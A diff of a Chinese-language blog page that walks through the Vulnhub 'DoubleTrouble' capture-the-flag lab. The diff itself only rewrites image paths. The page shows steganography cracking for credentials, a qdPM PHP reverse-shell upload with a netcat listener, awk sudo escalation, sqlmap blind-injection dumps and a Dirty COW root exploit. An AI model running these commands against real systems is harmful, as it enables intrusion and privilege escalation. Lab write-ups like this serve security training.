@@ -782,28 +782,28 @@ sudo apt-get install banner 安装一个文字图形输出
 <h2 id="实验步骤"><a class="anchor" href="#实验步骤">#</a> 实验步骤：</h2>
 <h4 id="步骤1-获取目标ip地址"><a class="anchor" href="#步骤1-获取目标ip地址">#</a> 步骤 1: 获取目标 IP 地址</h4>
 <p>​	方法一：使用 fscan 扫描一下 ip 段，获取目标 ip 为 192.168.12.178</p>
-<p><img data-src="image-20211022162158827.png" alt="image-20211022162158827" /></p>
+<p><img data-src="vulhub-doubletrouble/vulhub-doubletrouble/image-20211022162158827.png" alt="vulhub-doubletrouble/image-20211022162158827" /></p>
 <p>​	方法二：使用 Advanced IP Scanner 扫描指定 IP 段内的机器</p>
-<p><img data-src="image-20211022162138694.png" alt="image-20211022162138694" /></p>
+<p><img data-src="vulhub-doubletrouble/image-20211022162138694.png" alt="vulhub-doubletrouble/image-20211022162138694" /></p>
 <p>​</p>
 <h4 id="步骤2-使用nmap扫描目标开放端口"><a class="anchor" href="#步骤2-使用nmap扫描目标开放端口">#</a> 步骤 2: 使用 Nmap 扫描目标开放端口</h4>
 <p>​	使用 nmap 扫描 192.168.12.158，发现开放了 22、80 端口</p>
 <p>​	 <code>nmap -A -p- 192.168.12.158 -oN /root/桌面/doubletrouble.txt</code></p>
-<p>​	<img data-src="image-20211022163553259.png" alt="image-20211022163553259" /></p>
+<p>​	<img data-src="vulhub-doubletrouble/image-20211022163553259.png" alt="vulhub-doubletrouble/image-20211022163553259" /></p>
 <h4 id="步骤3-访问目标网站"><a class="anchor" href="#步骤3-访问目标网站">#</a> 步骤 3: 访问目标网站</h4>
 <p>​	浏览器访问 192.168.12.158，发现一个 Login 页面</p>
-<p>​	<img data-src="image-20211022162732808.png" alt="image-20211022162732808" /></p>
+<p>​	<img data-src="vulhub-doubletrouble/image-20211022162732808.png" alt="vulhub-doubletrouble/image-20211022162732808" /></p>
 <p>​	尝试了弱口令没有效果，这个页面没有办法处理，使用 dirsearch 扫描目录</p>
 <blockquote>
 <p>用法: dirsearch -u [域名 / IP 地址] -o [导出文件路径]</p>
 </blockquote>
 <p>​	 <code>dirsearch -u 192.168.12.158 -o /root/桌面/dir.txt </code></p>
-<p><img data-src="image-20211022191439315.png" alt="image-20211022191439315" /></p>
+<p><img data-src="vulhub-doubletrouble/image-20211022191439315.png" alt="vulhub-doubletrouble/image-20211022191439315" /></p>
 <p>​	使用 cat 命令筛选出 200 响应码的路径</p>
 <p>​	 <code>cat dir.txt | grep 200</code></p>
-<p>​	<img data-src="image-20211022191555234.png" alt="image-20211022191555234" /></p>
+<p>​	<img data-src="vulhub-doubletrouble/image-20211022191555234.png" alt="vulhub-doubletrouble/image-20211022191555234" /></p>
 <h4 id="步骤4-利用stegseek图片解密"><a class="anchor" href="#步骤4-利用stegseek图片解密">#</a> 步骤 4: 利用 stegseek 图片解密</h4>
-<p>​	在 /secret/ 目录中有个比较奇怪的图片，将它保存到本地<img data-src="image-20211022191657862.png" alt="image-20211022191657862" /></p>
+<p>​	在 /secret/ 目录中有个比较奇怪的图片，将它保存到本地<img data-src="vulhub-doubletrouble/image-20211022191657862.png" alt="vulhub-doubletrouble/image-20211022191657862" /></p>
 <p>​	使用 stegseek 对图片进行解密</p>
 <blockquote>
 <pre><code>github: https: //github.com/RickdeJager/stegseek/releases
@@ -813,15 +813,15 @@ sudo apt-get install banner 安装一个文字图形输出
 <pre><code>gunzip /usr/share/wordlists/rockyou.txt.gz
 sudo stegseek ./doubletrouble.jpg /usr/share/wordlists/rockyou.txt
 </code></pre>
-<p><img data-src="image-20211022191902565.png" alt="image-20211022191902565" /></p>
+<p><img data-src="vulhub-doubletrouble/image-20211022191902565.png" alt="vulhub-doubletrouble/image-20211022191902565" /></p>
 <p>​	使用 cat 查看解密出的文件，得出账号密码</p>
 <pre><code>otisrush@localhost.como
 tis666   `
 </code></pre>
-<p><img data-src="image-20211022191951620.png" alt="image-20211022191951620" /></p>
-<p>​	进入之前的登录窗口尝试登录一下，登录成功<img data-src="image-20211022192102168.png" alt="image-20211022192102168" /></p>
+<p><img data-src="vulhub-doubletrouble/image-20211022191951620.png" alt="vulhub-doubletrouble/image-20211022191951620" /></p>
+<p>​	进入之前的登录窗口尝试登录一下，登录成功<img data-src="vulhub-doubletrouble/image-20211022192102168.png" alt="vulhub-doubletrouble/image-20211022192102168" /></p>
 <p>​	之前在翻目录的时候看到 install 写着 qdPM 9.1</p>
-<p><img data-src="image-20211022192315499.png" alt="image-20211022192315499" /></p>
+<p><img data-src="vulhub-doubletrouble/image-20211022192315499.png" alt="vulhub-doubletrouble/image-20211022192315499" /></p>
 <h2 id="qdpm漏洞利用"><a class="anchor" href="#qdpm漏洞利用">#</a> qdPM 漏洞利用</h2>
 <h4 id="步骤6php反弹shell"><a class="anchor" href="#步骤6php反弹shell">#</a> 步骤 6：php 反弹 shell</h4>
 <p>​	发现就是用户的 myAccount 界面的图片那一栏是可以上传文件的，我们上传一个 php 反弹 shell 的脚本</p>
@@ -882,81 +882,81 @@ $res = execute(which('perl').&quot; /tmp/.bc $yourip $yourport &amp;&quot;);
 <p>上传 shell 脚本地址：</p>
 <pre><code>http: //192.168.xxx.xxx/index.php/myAccount
 </code></pre>
-<p><img data-src="image-20211022193246249.png" alt="image-20211022193246249" /></p>
+<p><img data-src="vulhub-doubletrouble/image-20211022193246249.png" alt="vulhub-doubletrouble/image-20211022193246249" /></p>
 <p>​	上传成功后，在 kali 中开启监听</p>
 <p>​	 <code>nc -lnvp 4444</code></p>
-<p>​	<img data-src="image-20211022193338295.png" alt="image-20211022193338295" /></p>
+<p>​	<img data-src="vulhub-doubletrouble/image-20211022193338295.png" alt="vulhub-doubletrouble/image-20211022193338295" /></p>
 <p>​	打开 uploads/users 中有我们上传到的 php 脚本，点击 php 开始执行，shell 反弹成功</p>
-<p>​	<img data-src="image-20211022193545670.png" alt="image-20211022193545670" /></p>
+<p>​	<img data-src="vulhub-doubletrouble/image-20211022193545670.png" alt="vulhub-doubletrouble/image-20211022193545670" /></p>
 <p>​	使用 python 改成伪交互式的 shell</p>
 <p>​	 <code>python -c &quot;import pty;pty.spawn('/bin/bash')&quot;</code></p>
-<p>​	<img data-src="image-20211022193920424.png" alt="image-20211022193920424" /></p>
+<p>​	<img data-src="vulhub-doubletrouble/image-20211022193920424.png" alt="vulhub-doubletrouble/image-20211022193920424" /></p>
 <h2 id="提权"><a class="anchor" href="#提权">#</a> 提权</h2>
 <p>​</p>
 <p>​	查看当前用户能使用 sudo 的权限 ，可免密执行 awk 命令</p>
-<p>​	<img data-src="image-20211022194739519.png" alt="image-20211022194739519" /></p>
+<p>​	<img data-src="vulhub-doubletrouble/image-20211022194739519.png" alt="vulhub-doubletrouble/image-20211022194739519" /></p>
 <p>​	awk 命令可以进行提权</p>
 <p>​	 <code>sudo awk 'BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;'</code></p>
-<p>​	<img data-src="image-20211022201042933.png" alt="image-20211022201042933" /></p>
+<p>​	<img data-src="vulhub-doubletrouble/image-20211022201042933.png" alt="vulhub-doubletrouble/image-20211022201042933" /></p>
 <p>​	进入 root 目录，ls 查看一下，下载 doubletrouble.ova</p>
-<p>​	<img data-src="image-20211022201850780.png" alt="image-20211022201850780" /></p>
+<p>​	<img data-src="vulhub-doubletrouble/image-20211022201850780.png" alt="vulhub-doubletrouble/image-20211022201850780" /></p>
 <p>​	首先查看一下是否有 python3 环境</p>
 <p>​	 <code>python3 -V</code></p>
-<p>​	<img data-src="image-20211022202714437.png" alt="image-20211022202714437" /></p>
+<p>​	<img data-src="vulhub-doubletrouble/image-20211022202714437.png" alt="vulhub-doubletrouble/image-20211022202714437" /></p>
 <p>​	使用 python3 开启一个 http 服务，然后从本地下载 doubeltrouble.ova 导入</p>
 <p>​	 <code>python3 -m http.server 8888</code></p>
-<p><img data-src="image-20211022202648058.png" alt="image-20211022202648058" /></p>
-<p><img data-src="image-20211022202817305.png" alt="image-20211022202817305" /></p>
+<p><img data-src="vulhub-doubletrouble/image-20211022202648058.png" alt="vulhub-doubletrouble/image-20211022202648058" /></p>
+<p><img data-src="vulhub-doubletrouble/image-20211022202817305.png" alt="vulhub-doubletrouble/image-20211022202817305" /></p>
 <p>​	导入后扫描一下 ip</p>
 <blockquote>
 <p>目标 IP 地: 192.168.12.58</p>
 </blockquote>
-<p><img data-src="image-20211022205106315.png" alt="image-20211022205106315" /></p>
+<p><img data-src="vulhub-doubletrouble/image-20211022205106315.png" alt="vulhub-doubletrouble/image-20211022205106315" /></p>
 <p>​	使用 nmap 扫描一下开放端口</p>
 <p>​	 <code>nmap -A -p- 192.168.12.58</code></p>
-<p><img data-src="image-20211022210136685.png" alt="image-20211022210136685" /></p>
+<p><img data-src="vulhub-doubletrouble/image-20211022210136685.png" alt="vulhub-doubletrouble/image-20211022210136685" /></p>
 <p>​	开放端口 22、80</p>
 <p>​	访问 80 端口，发现是一个登录界面</p>
-<p>​	<img data-src="image-20211022210925530.png" alt="image-20211022210925530" /></p>
+<p>​	<img data-src="vulhub-doubletrouble/image-20211022210925530.png" alt="vulhub-doubletrouble/image-20211022210925530" /></p>
 <p>​	尝试使用万能密码，测试是否存在注入</p>
 <p>​	使用 burp 抓包，导出为 txt 文件，使用 sqlmap 测试</p>
-<p>​	<img data-src="image-20211022211235472.png" alt="image-20211022211235472" /></p>
-<p>​	<img data-src="image-20211022211347686.png" alt="image-20211022211347686" /></p>
-<p><img data-src="image-20211022211538042.png" alt="image-20211022211538042" /></p>
+<p>​	<img data-src="vulhub-doubletrouble/image-20211022211235472.png" alt="vulhub-doubletrouble/image-20211022211235472" /></p>
+<p>​	<img data-src="vulhub-doubletrouble/image-20211022211347686.png" alt="vulhub-doubletrouble/image-20211022211347686" /></p>
+<p><img data-src="vulhub-doubletrouble/image-20211022211538042.png" alt="vulhub-doubletrouble/image-20211022211538042" /></p>
 <pre><code>sqlmap跑出 uname存在时间延时盲注
 </code></pre>
 <p>​	使用 sqlmap 跑用户名</p>
 <p>​	 <code>python3 sqlmap.py -r /root/桌面/sql.txt -D doubletrouble -T users -C username --dump --batch --threads 10</code></p>
-<p>​	<img data-src="image-20211022212640708.png" alt="image-20211022212640708" /></p>
+<p>​	<img data-src="vulhub-doubletrouble/image-20211022212640708.png" alt="vulhub-doubletrouble/image-20211022212640708" /></p>
 <p>​	sqlmap 跑密码</p>
 <p>​	 <code>python3 sqlmap.py -r /root/桌面/sql.txt -D doubletrouble -T users -C password --dump --batch --threads 10</code></p>
-<p>​	<img data-src="image-20211022213344601.png" alt="image-20211022213344601" /></p>
+<p>​	<img data-src="vulhub-doubletrouble/image-20211022213344601.png" alt="vulhub-doubletrouble/image-20211022213344601" /></p>
 <p>​	尝试在网站上登录，两个都不好使，尝试使用 ssh 登录</p>
-<p>​	<img data-src="image-20211022214311920.png" alt="image-20211022214311920" /></p>
+<p>​	<img data-src="vulhub-doubletrouble/image-20211022214311920.png" alt="vulhub-doubletrouble/image-20211022214311920" /></p>
 <p>​	登陆成功，查看系统版本内核</p>
 <pre><code>uname -r
 uname -a
 得到版本是3.2.0-4
 </code></pre>
-<p><img data-src="image-20211022214436791.png" alt="image-20211022214436791" /></p>
+<p><img data-src="vulhub-doubletrouble/image-20211022214436791.png" alt="vulhub-doubletrouble/image-20211022214436791" /></p>
 <p>​	使用 <code>cat /etc/*-release</code>  看到是 Debian 7 系统</p>
-<p><img data-src="image-20211022214642153.png" alt="image-20211022214642153" /></p>
+<p><img data-src="vulhub-doubletrouble/image-20211022214642153.png" alt="vulhub-doubletrouble/image-20211022214642153" /></p>
 <p>​	Debian 7 系统可以通过脏牛提权</p>
 <blockquote>
 <p>github: https: <a href="//github.com/FireFart/dirtycow">//github.com/FireFart/dirtycow</a></p>
-<p>​	<img data-src="image-20211022214856123.png" alt="image-20211022214856123" /></p>
+<p>​	<img data-src="vulhub-doubletrouble/image-20211022214856123.png" alt="vulhub-doubletrouble/image-20211022214856123" /></p>
 </blockquote>
 <p>​	在靶机上 <code>gcc -v</code>  查看是否有 gcc 编译环境</p>
-<p><img data-src="image-20211022215047970.png" alt="image-20211022215047970" /></p>
+<p><img data-src="vulhub-doubletrouble/image-20211022215047970.png" alt="vulhub-doubletrouble/image-20211022215047970" /></p>
 <p>​	传到目标靶机上，然后进行编译</p>
-<p><code>scp /root/桌面/内网工具/脏牛/dirtycow/dirty.c clapton@192.168.12.58: /tmp </code> <img data-src="image-20211022215157188.png" alt="image-20211022215157188" /></p>
+<p><code>scp /root/桌面/内网工具/脏牛/dirtycow/dirty.c clapton@192.168.12.58: /tmp </code> <img data-src="vulhub-doubletrouble/image-20211022215157188.png" alt="vulhub-doubletrouble/image-20211022215157188" /></p>
 <p>​	 <code>gcc -pthread dirty.c -o dirty -lcrypt</code></p>
-<p><img data-src="image-20211022215311781.png" alt="image-20211022215311781" /></p>
+<p><img data-src="vulhub-doubletrouble/image-20211022215311781.png" alt="vulhub-doubletrouble/image-20211022215311781" /></p>
 <p>​	然后去执行 dirty</p>
-<p>​	<img data-src="image-20211022215345404.png" alt="image-20211022215345404" /></p>
+<p>​	<img data-src="vulhub-doubletrouble/image-20211022215345404.png" alt="vulhub-doubletrouble/image-20211022215345404" /></p>
 <p>​	 <code>su firefart</code></p>
 <p>​	登录到 firefart 上</p>
-<p><img data-src="image-20211022215539698.png" alt="image-20211022215539698" /></p>
+<p><img data-src="vulhub-doubletrouble/image-20211022215539698.png" alt="vulhub-doubletrouble/image-20211022215539698" /></p>
 <p>​	成功获取到 root 权限以及 flag</p>
 <blockquote>
 <p>flag: 1B8EEA89EA92CECB931E3CC25AA8DE21</p>
